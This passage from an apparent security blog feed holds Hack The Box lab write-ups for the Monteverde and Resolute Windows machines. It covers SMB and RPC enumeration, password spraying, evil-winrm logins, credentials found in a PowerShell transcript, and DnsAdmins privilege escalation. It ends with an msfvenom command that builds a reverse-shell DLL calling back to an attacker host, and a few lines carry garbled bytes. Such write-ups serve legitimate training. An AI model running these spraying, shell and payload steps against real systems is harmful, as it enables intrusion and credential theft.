��&amp;lt;Objs Version=&amp;#34;1.1.0.1&amp;#34; xmlns=&amp;#34;http://schemas.microsoft.com/powershell/2004/04&amp;#34;&amp;gt;
&amp;lt;Obj RefId=&amp;#34;0&amp;#34;&amp;gt;
&amp;lt;TN RefId=&amp;#34;0&amp;#34;&amp;gt;
&amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;
&amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
&amp;lt;/TN&amp;gt;
&amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;
&amp;lt;Props&amp;gt;
&amp;lt;DT N=&amp;#34;StartDate&amp;#34;&amp;gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
&amp;lt;DT N=&amp;#34;EndDate&amp;#34;&amp;gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
&amp;lt;G N=&amp;#34;KeyId&amp;#34;&amp;gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
&amp;lt;S N=&amp;#34;Password&amp;#34;&amp;gt;4n0therD4y@n0th3r$&amp;lt;/S&amp;gt;
&amp;lt;/Props&amp;gt;
&amp;lt;/Obj&amp;gt;
&amp;lt;/Objs&amp;gt;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Let&amp;rsquo;s check it via &lt;code>crackmapexec&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.172 -u mhope -p &amp;#39;4n0therD4y@n0th3r$&amp;#39;
SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ crackmapexec winrm 10.10.10.172 -u mhope -p &amp;#39;4n0therD4y@n0th3r$&amp;#39;
SMB 10.10.10.172 5985 MONTEVERDE [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP 10.10.10.172 5985 MONTEVERDE [*] http://10.10.10.172:5985/wsman
WINRM 10.10.10.172 5985 MONTEVERDE [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>We can &lt;code>evil-winrm&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/monteverde/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Resolute</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/resolute/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/resolute/</guid><description>&lt;h1 id="resolute">Resolute&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.169 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 16:49 BST
Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 30.27% done; ETC: 16:58 (0:06:20 remaining)
Nmap scan report for 10.10.10.169 (10.10.10.169)
Host is up (0.16s latency).
Not shown: 65511 closed tcp ports (conn-refused)
PORT STATE SERVICE
53/tcp open domain
88/tcp open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap
445/tcp open microsoft-ds
464/tcp open kpasswd5
593/tcp open http-rpc-epmap
636/tcp open ldapssl
3268/tcp open globalcatLDAP
3269/tcp open globalcatLDAPssl
5985/tcp open wsman
9389/tcp open adws
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49667/tcp open unknown
49671/tcp open unknown
49678/tcp open unknown
49679/tcp open unknown
49684/tcp open unknown
49717/tcp open unknown
50287/tcp open unknown
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.169 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 18:02 BST
Nmap scan report for 10.10.10.169 (10.10.10.169)
Host is up (0.17s latency).
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-04 17:08:39Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp open microsof��λ�U Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf .NET Message Framing
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb-os-discovery:
| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
| Computer name: Resolute
| NetBIOS computer name: RESOLUTE\x00
| Domain name: megabank.local
| Forest name: megabank.local
| FQDN: Resolute.megabank.local
|_ System time: 2023-09-04T10:08:48-07:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: required
| smb2-time:
| date: 2023-09-04T17:08:49
|_ start_date: 2023-09-04T15:51:23
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
|_clock-skew: mean: 2h26m23s, deviation: 4h02m30s, median: 6m22s
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.169
Anonymous login successful
Sharename Type Comment
--------- ---- -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>rpc&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ rpcclient -U &amp;#34;&amp;#34; -N 10.10.10.169
rpcclient $&amp;gt; querydominfo
Domain: MEGABANK
Server:
Comment:
Total Users: 79
Total Groups: 0
Total Aliases: 0
Sequence No: 1
Force Logoff: -1
Domain Server State: 0x1
Server Role: ROLE_DOMAIN_PDC
Unknown 3: 0x1
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>rpcclient $&amp;gt; enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>rpcclient $&amp;gt; querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail Name: (null) Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator Name: (null) Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela Name: (null) Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette Name: (null) Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika Name: (null) Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire Name: (null) Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude Name: (null) Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null) Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia Name: (null) Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null) Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo Name: (null) Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null) Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: (null) Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie Name: (null) Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki Name: (null) Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo Name: (null) Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per Name: (null) Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan Name: Ryan Bertrand Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally Name: (null) Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon Name: (null) Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve Name: (null) Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie Name: (null) Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita Name: (null) Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf Name: (null) Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null) Desc: (null)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>We can also dump information using &lt;code>ldapsearch&lt;/code>
&lt;ul>
&lt;li>&lt;code>ldapsearch -H ldap://10.10.10.169 -x -b &amp;quot;DC=MEGABANK,DC=LOCAL&amp;quot; &lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="footholduser-1">Foothold/User #1&lt;/h2>
&lt;ul>
&lt;li>Okay, looks like &lt;code>marco&lt;/code> is newly created account with comment &lt;code>Account created. Password set to Welcome123!&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.169 -u marco -p &amp;#39;Welcome123!&amp;#39;
SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\marco:Welcome123! STATUS_LOGON_FAILURE
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>We could try password spraying with `Welcome123!
&lt;ul>
&lt;li>It could be that some of the users haven&amp;rsquo;t changed it yet&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.169 -u users.list -p &amp;#39;Welcome123!&amp;#39; --continue-on-success
SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\melanie:Welcome123!
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE
SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>We have a hit &lt;code>melanie:Welcome123!&lt;/code>
&lt;ul>
&lt;li>Let&amp;rsquo;s try &lt;code>evil-winrm&lt;/code> and it works&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ evil-winrm -i 10.10.10.169 -u melanie -p &amp;#39;Welcome123!&amp;#39;
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="user-2">User #2&lt;/h2>
&lt;ul>
&lt;li>We have another user &lt;code>ryan&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\&amp;gt; ls -force users
Directory: C:\users
Mode LastWriteTime Length Name
---- ------------- ------ ----
d----- 9/25/2019 10:43 AM Administrator
d--hsl 7/16/2016 6:28 AM All Users
d-rh-- 9/25/2019 10:17 AM Default
d--hsl 7/16/2016 6:28 AM Default User
d----- 12/4/2019 2:46 AM melanie
d-r--- 11/20/2016 6:39 PM Public
d----- 9/27/2019 7:05 AM ryan
-a-hs- 7/16/2016 6:16 AM 174 desktop.ini
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Before running &lt;code>winpeas&lt;/code>, I will manually check obvious places&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\&amp;gt; ls -force c:\
Directory: C:\
Mode LastWriteTime Length Name
---- ------------- ------ ----
d--hs- 12/3/2019 6:40 AM $RECYCLE.BIN
d--hsl 9/25/2019 10:17 AM Documents and Settings
d----- 9/25/2019 6:19 AM PerfLogs
d-r--- 9/25/2019 12:39 PM Program Files
d----- 11/20/2016 6:36 PM Program Files (x86)
d--h-- 9/25/2019 10:48 AM ProgramData
d--h-- 12/3/2019 6:32 AM PSTranscripts
d--hs- 9/25/2019 10:17 AM Recovery
d--hs- 9/25/2019 6:25 AM System Volume Information
d-r--- 12/4/2019 2:46 AM Users
d----- 12/4/2019 5:15 AM Windows
-arhs- 11/20/2016 5:59 PM 389408 bootmgr
-a-hs- 7/16/2016 6:10 AM 1 BOOTNXT
-a-hs- 9/4/2023 8:51 AM 402653184 pagefile.sys
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>C:\PSTranscripts&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\PSTranscripts\20191203&amp;gt; ls -force
Directory: C:\PSTranscripts\20191203
Mode LastWriteTime Length Name
---- ------------- ------ ----
-arh-- 12/3/2019 6:45 AM 3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Let&amp;rsquo;s check the content&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\PSTranscripts\20191203&amp;gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS&amp;gt;TerminatingError(): &amp;#34;System error.&amp;#34;
&amp;gt;&amp;gt; CommandInvocation(Invoke-Expression): &amp;#34;Invoke-Expression&amp;#34;
&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&amp;#34;Command&amp;#34;; value=&amp;#34;-join($id,&amp;#39;PS &amp;#39;,$(whoami),&amp;#39;@&amp;#39;,$env:computername,&amp;#39; &amp;#39;,$((gi $pwd).Name),&amp;#39;&amp;gt; &amp;#39;)
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&amp;#34;
&amp;gt;&amp;gt; CommandInvocation(Out-String): &amp;#34;Out-String&amp;#34;
&amp;gt;&amp;gt; ParameterBinding(Out-String): name=&amp;#34;Stream&amp;#34;; value=&amp;#34;True&amp;#34;
**********************
Command start time: 20191203063455
**********************
PS&amp;gt;ParameterBinding(Out-String): name=&amp;#34;InputObject&amp;#34;; value=&amp;#34;PS megabank\ryan@RESOLUTE Documents&amp;gt; &amp;#34;
PS megabank\ryan@RESOLUTE Documents&amp;gt;
**********************
Command start time: 20191203063515
**********************
PS&amp;gt;CommandInvocation(Invoke-Expression): &amp;#34;Invoke-Expression&amp;#34;
&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&amp;#34;Command&amp;#34;; value=&amp;#34;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&amp;#34;
&amp;gt;&amp;gt; CommandInvocation(Out-String): &amp;#34;Out-String&amp;#34;
&amp;gt;&amp;gt; ParameterBinding(Out-String): name=&amp;#34;Stream&amp;#34;; value=&amp;#34;True&amp;#34;
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS&amp;gt;CommandInvocation(Out-String): &amp;#34;Out-String&amp;#34;
&amp;gt;&amp;gt; ParameterBinding(Out-String): name=&amp;#34;InputObject&amp;#34;; value=&amp;#34;The syntax of this command is:&amp;#34;
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotSpecified: (The syntax of this command is::String) [], RemoteException
+ FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotSpecified: (The syntax of this command is::String) [], RemoteException
+ FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>We found creds: &lt;code>ryan:Serv3r4Admin4cc123!&lt;/code>
&lt;ul>
&lt;li>If we check &lt;code>ryan&lt;/code> groups membership, we see that he can &lt;code>evil-winrm&lt;/code> since he&amp;rsquo;s in &lt;code>Contractors&lt;/code> group&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\PSTranscripts\20191203&amp;gt; net user ryan
User name ryan
Full Name Ryan Bertrand
Comment
User&amp;#39;s comment
Country/region code 000 (System Default)
Account active Yes
Account expires Never
Password last set 9/4/2023 10:36:02 AM
Password expires Never
Password changeable 9/5/2023 10:36:02 AM
Password required Yes
User may change password Yes
Workstations allowed All
Logon script
User profile
Home directory
Last logon Never
Logon hours allowed All
Local Group Memberships
Global Group memberships *Domain Users *Contractors
The command completed successfully.
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\PSTranscripts\20191203&amp;gt; net localgroup &amp;#34;Remote Management Users&amp;#34;
Alias name Remote Management Users
Comment Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
Members
-------------------------------------------------------------------------------
Contractors
melanie
The command completed successfully.
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Let&amp;rsquo;s connect&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ evil-winrm -i 10.10.10.169 -u ryan -p &amp;#39;Serv3r4Admin4cc123!&amp;#39;
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="root">Root&lt;/h2>
&lt;ul>
&lt;li>&lt;code>ryan&lt;/code>&amp;rsquo;s full group membership
&lt;ul>
&lt;li>&lt;code>ryan&lt;/code> is a member of &lt;a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins" target="_blank" rel="noopener">DnsAdmins&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan&amp;gt; whoami /groups
GROUP INFORMATION
-----------------
Group Name Type SID Attributes
========================================== ================ ============================================== ===============================================================
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors Group S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins Alias S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label S-1-16-8192
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Found a &lt;code>note.txt&lt;/code> on &lt;code>ryan&lt;/code>&amp;rsquo;s desktop&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan&amp;gt; type desktop\note.txt
Email to team:
- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>There is a nice &lt;a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank" rel="noopener">post&lt;/a> about privilege escalation from &lt;code>DnsAdmins&lt;/code> to &lt;code>System&lt;/code>
&lt;ul>
&lt;li>Also &lt;a href="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/" target="_blank" rel="noopener">https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin" target="_blank" rel="noopener">https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>We will use &lt;a href="https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/" target="_blank" rel="noopener">dnscmd&lt;/a>
&lt;ul>
&lt;li>First, we generate payload using &lt;code>msfvenom&lt;/code>
&lt;ul>
&lt;li>But in my case the payload didn&amp;rsquo;t work, since it can detected by &lt;code>AV&lt;/code>&lt;/li>
&lt;li>So do not upload it to box&lt;/li>
&lt;li>Or we have an option to build our own &lt;code>dll&lt;/code>
&lt;ul>
&lt;li>&lt;a href="https://github.com/dim0x69/dns-exe-persistance.git" target="_blank" rel="noopener">https://github.com/dim0x69/dns-exe-persistance.git&lt;/a>&lt;/li>
&lt;li>It requires &lt;code>Visual Studio 2017&lt;/code>&lt;/li>
&lt;li>We also need &lt;code>c++&lt;/code> reverse shell code&lt;/li>
&lt;li>Watch &lt;a href="https://www.youtube.com/watch?v=8KJebvmd1Fk&amp;amp;list=PLidcsTyj9JXI9E9dT1jgXxvTOi7Pq_2c5&amp;amp;index=11" target="_blank" rel="noopener">ippsec&amp;rsquo;s video&lt;/a> how to do that&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.5 LPORT=6666 -f dll &amp;gt; evil.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
